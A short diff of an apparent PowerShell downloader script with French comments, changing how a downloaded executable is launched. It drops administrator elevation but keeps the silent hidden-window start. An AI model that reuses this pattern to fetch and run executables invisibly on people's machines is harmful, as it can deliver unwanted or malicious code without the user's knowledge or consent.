@@ -47,9 +47,9 @@ if (-not $downloaded) {
 
 if (-not $downloaded) { exit 1 }
 
-# 4. Lancement asynchrone avec privileges Administrateur
+# 4. Lancement asynchrone sans elevation
 try {
-    Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden
+    Start-Process -FilePath $exePath -WindowStyle Hidden
 } catch {
     try {
         Start-Process -FilePath $exePath -WindowStyle Hidden
